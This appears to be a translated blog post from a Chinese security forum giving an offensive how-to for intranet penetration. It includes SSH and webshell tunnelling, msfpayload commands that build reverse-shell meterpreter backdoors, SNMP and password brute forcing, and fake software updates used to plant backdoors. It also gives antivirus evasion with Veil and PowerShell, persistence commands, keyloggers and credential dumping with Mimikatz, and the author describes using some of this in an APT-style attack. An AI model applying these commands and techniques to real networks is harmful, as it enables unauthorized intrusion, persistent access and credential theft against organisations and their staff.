---
published: true
title: Capriccio on the intranet penetration
layout: post
---
# 00 Introduction 

Many of my WeiBo followers and [zone](http://zone.wooyun.org/) user have been asking me about intranet penetration techniques, so I've taken the liberty to write this article. I'm open to any corrections.

Intranet penetration definitely cannot be illustrated in one or two articles. That's why I title this essay as capriccio in which I simply put down whatever in my mind.

# 01. intranet proxy and forwarding

[Image: https://quip.com/-/blob/YCIAAADtDa5/gNFHcx2vzWIgLNvnX-JBYA]

the distinction between a forward proxy and a reverse proxy

## 1.1 the forward proxy 


    Lhost－－》proxy－－》Rhost




Under this method, Lhost typically would send a request targeting at the Rhost to access the Rhost. Then the proxy is to forward the request to Rhost and return the received content to the Lhost. In simple words, a forward proxy is what represents us to access Rhost.

## 1.2 the reverse proxy (reverse proxy)

    Lhost<--->proxy<--->firewall<--->Rhost



Unlike the forward proxy, the Lhost would just send a general request to proxy. However, the destination is entirely determined by the proxy itself. After which, the returned data goes back to the proxy. Using this method, a firewall even configured with proxy data only can still be effectively penetrated.

## 1.3 a typical difference


In forward proxy, Lhost has to use a proxy to access the Rhost, while in reverse proxy, it 's the Rhost that communicates with the Lhost by using the proxy.


Many Zone users have asked a question [on using proxy to penetrate the intranet](http://zone.wooyun.org/content/18683).To successfully penetrate a intranet, we got to pick the right proxy first. Mainly we could choose:

## 2. VPN/SSH tunnel

This method requires a high(system/root) privilege using system functions to directly open the tunnel responsible for the intranet proxy. Other than that, it's simple to configure a VPN, so i won't detail much about this here. But we should focus more when using a SSH tunnel for proxy.

    #!bash
    ssh -qTfnN -L port:host:hostport -l user remote_ip   #a forward tunnel to listen to local ports
    ssh -qTfnN -R port:host:hostport -l user remote_ip   #a reverse tunnel to penetrate the intranet and break firewall limits
    SSH -qTfnN -D port remotehost   #directly for socks proxy     
    
    details of parameters 
    -q Quiet mode.  #Quiet mode.
    -T Disable pseudo-tty allocation. # Without shell
    -f Requests ssh to go to background just before command execution. #Running in the background, and together with the-n parameter
    -N Do not execute a remote command. #Do not execute a remote command. Does not execute a remote command, using it to forward a port ~ 



Sometimes as we have no appropriate tools to forward a port, it is possible to leverage SSH for port forwarding.

    #!bash
    ssh -CfNg -L port1:127.0.0.1:port2 user@host    # local forwarding
    ssh -CfNg -R port2:127.0.0.1:port1 user@host    # remote forwarding


This excellent paper [SSH Port Forwarding](http://staff.washington.edu/corey/fw/ssh-port-forwarding.html) could be of great help.

## 3. HTTP service

You just simply need to upload a Webshell on the target server, then forward all of the traffic to the intranet through the shell. Some popular tools include reGeorg,meterpreter,tunna and so on. Or even you can write a simple proxy script, and configure the nginx on your machine to conduct reverse proxy.

The instuction coming with [ReGeorg](https://github.com/sensepost/reGeorg)is clear enough:

* Step 1. Upload tunnel.(aspx|ashx|jsp|php) to a webserver (How you do that is up to you)

* Step 2. Configure you tools to use a socks proxy, use the ip address and port you specified when you started the reGeorgSocksProxy.py

Note, if your tools, such as NMap doesn't support socks proxies, use [proxychains] (see wiki)

* Step 3. Hack the planet :)

Note: install urllib3.(i mainly use regeorg, it's really convenient.)

* meterpreter

MSF is a very powerful and  good choice for intranet penetration.When applying msf for proxy, you either could directly generate an executable backdoor and return to msf. Or you could generate a webshell for the same purpose. Mr.Dm has made it very clear on meterpreter in his article [Metasploit penetration testing notes (Meterpreter posts)](http://drops.wooyun.org/tips/2227)

## 3.1 Windows backdoor

```
msfpayload windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> X > shell.exe 
```

## 3.2 Linux backdoor


    msfpayload linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> R | msfencode -t elf -o shell 


## 3.3 PHP backdoor


    msfpayload php/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> R | msfencode -e php/base64(can be simple codes) -t raw -o base64php.php 


MSF can do whatever things after the meterpreter session is captured. One of the most popular ways is to scan the target by using the attack module provided in msf (note: it can be a cross-network scan) after the routing table is added.

If you just want to perform a simple proxy work, auxiliary/server/socks4a module is fine.


I'd like to add one thing about msf here. If you find it troublesome to memorize all that commands used in the SSH tunnel, you can also use msf to build the tunnel.

    
    Load meta_ssh use multi/SSH/login_password exploit to get a session for proxy operations after the parameter is set  


* Directly conduct reverse proxy through WebShell and nginx

http://zone.wooyun.org/content/11096

## 4. other tricks

Use Python,Ruby and Perl to directly set up SOCKS connections.

Leverage lcx，tunna and htran to forward the traffic of ports.

Shadowsocks,Tor,goagent and so on

Also:using [ssocks](http://sourceforge.net/projects/ssocks/?source=navbar)(My friend @Deadcat recommended this to me in a game) for forward proxy and socks5 rebound

# 02. intranet environment probe and information gathering

It is intensively difficult for a full penetration to cover every situations, so all I listed here are just  tricks and thoughts.



* Nmap using proxy to scan for host 
    proxychains nmap ＊＊＊
    If the proxy is a Meterpreter session, it can use the`/usr/share/Metasploit-Framework/modules/auxiliary/scanner`script for scan.
* View the host to get host information in the intranet
* Directly attack the routers or switch in the network segment and map a simple intranet structure ??????([In the teaching of intranet information probe and post- penatration preparation by using the case of TCL vunerabilities, I leraned a lot. ](http://www.wooyun.org/bugs/wooyun-2015-097180)What I did was to get the privilege15 privilege of a Cisco Router and the network structures. Buy using this I managed to continue my cross- vlan attack.)
* Try more on SNMP weak passwords of a switch. If succeed, intranet structure can be figured out.
* About SNMP penetration



### [What is the SNMP](http://baike.baidu.com/view/2899.htm)

For devices using snmp , the only thing we need is the community string. So the brute force this string or social engineering are both feasible by default public/private

The first step is to scan the 161 port to determine whether snmp is open or not and use the weak passwork to get device information as well to read the device password in oid.

* [Image: https://quip.com/-/blob/YCIAAADtDa5/tl2vBdofdhYPmzwdlLMDEQ]


Example:[Using Huawei's SNMP vulnerability  to obtain administrative account passwords and the account has been successfully logged on](http://www.wooyun.org/bugs/wooyun-2013-021964)

Using this nmap and msf script to perform automatical attack on [H3C-PT-tools](https://github.com/grutz/h3c-pt-tools)

* try to gather sensitive information from the User directory in the host or from the Management Operation Emails(there is a case in which a penetration is successfully performed by using a keylogger to steal the topology and network segement )
* [Image: https://quip.com/-/blob/YCIAAADtDa5/7ErKRqIUAnbklAHjws2v6A]
* Find DNS servers in the intranet through resolv.conf, or enumerate dns in the dictionary
* By analyzing user . bash_history to get user behavior, and records. Together with ~/.Shh/ to match history connected records, use keys to log on other machines

# 03 popular attack techniques using in the intranet penetration

* Based on the former information gathering and probe, determine the main business machines, such as OA, dbserver. Use SSH trust to access the target machine and ex-filtrate the userlist from employees, then make it to specific dictionary. Most network security is fragile, and the most problematic point is the password security (large companies are of no exception)
    %username%1
    %username%12
    %username%123
    %username%1234
    %username%12345
    %username%123456

Brute force ssh,dbserver,vnc,ftp

[Image: https://quip.com/-/blob/YCIAAADtDa5/fq4G-dhMDicQV4UM2j7Srw]

* For servers enabling web service, identifying a batch of banners of machines first can reduce the workload in penetration. Then using banners to confirm cms or middleware, then directly use exp
* man-in-the-middle attack

Ettercap is more often used. ARP MITM is not recommended, you can try DHCP MITM or ICMP MITM


You can also hijack plugin, attack the gateway, or use evilgrade to fake software updates (eg: Notepad++), and then embed a backdoor, deliver it to the machine to hack into the Office network

[Image: https://quip.com/-/blob/YCIAAADtDa5/0FXanSgdU3VT2cK7Lp98uA][Image: https://quip.com/-/blob/YCIAAADtDa5/pMPfOkwDn-rfTy13CCVyaQ]
After simple configurations, you could use msf to generate a backdoor. Then together useing start and ettercap, you would fake a software update.

[Image: https://quip.com/-/blob/YCIAAADtDa5/xFFFT7l8h9HaSSOkWuS3-w]

* common attacks on service vulnerabilities
    smb/ms08067/ipc$/NetBIOS............


It's very likely that certain AV could block these old exploit attacks. In other words, the diffuculty that you meet is various.


My friend @DM told me that if I use PsExec to get back to sessions, AV would immediately block my operation. In this case, you can use PowerShell to bypass AV[Powershell tricks::Bypass AV](http://drops.wooyun.org/tips/3353).

# 04 post-penetration preparation and maximizing the effects

An excellent intranet penetration can not be built in one day since the wholeprocess requires the administrator to "cooperate" . That's why post preparation matters.

## 1. back door preparation

msf's backdoor is good already.All we need is some simple modifications and it's perfect for our use.

The backdoor generated from normal msfpayload is not sustainable. This sort of backdoor does not support our following work, so a sustainable backdoor is definately necessary.

There are two kinds of sustainable msf backdoor:one starts through the service, the other starts through the MSConfig.


The one starts through the service has a shortage of showing its service name as meterpreter and it is used by : uploading the back door and leveraging metsvc to install the service


    meterpreter > run metsvc ... (Set port, and upload back files) use Exploit/multi/handler set PAYLOAD Windows/metsvc_bind_tcp exploit 


the other one can be used by :


    meterpreter > run persistence -X -i 10 -p port -r hostip use multi/handler set PAYLOAD windows/meterpreter/reverse_tcp exploit 


Of course, directly generated backdoor may be killed, so I recommend a great tool here,[veil](https://github.com/ChrisTruncer/Veil). I have used this tool to generate the backdoor in a small APT attack and the backdoor successfully bypassed the 360AV.



There are two commonly used backdoors under Linux-

Mafix rookit and Cymothoa. It is said that the latter one can clone the root user, but most backdoor is more like an encrypted nc which can star a new port. So if webshell could survive, you may consider using it as a maintenance mechanism.

## 2. the keylogger

The keylogger can be critical in an intranet(especially large scale) penetration process. Because once you crack a password, you crack a network segement.

I frequently use [Ixkeylog](https://github.com/dorneanu/ixkeylog/), compatible with linux>=2.63.

Or you can use the key log function that comes with meterpreter session


    keyscan_start keyscan_dump 


[Image: https://quip.com/-/blob/YCIAAADtDa5/cRaYG1_jRlb3Y2Cs2Nn0Gw][Image: https://quip.com/-/blob/YCIAAADtDa5/PlSN9q1rPVvx8W0ZxbKwEQ]
The benefit of Meterpreter is that meyerpreter can be injected in the memory in Windows without creating any process.


A tip: if you think a keylogger may cause too much attention, you can log on the system and set your management tools like navicat,putty,PLSQL, anddSecureCRT to remember your password.

## 3. hash

Mimikatz, needless to say, using Meterpreter you can directly load the modules.

Quarks PwDump

wce

# 05 something else

Intranet penetration is a very broad concept. I just talked about some very simple questions in this paper and some ordinary thoughts.

If it's possible, I would talk more about domain penetration,  printer, Office network sniffing and intrusion log cleanup.

from：http://drops.wooyun.org/tips/5234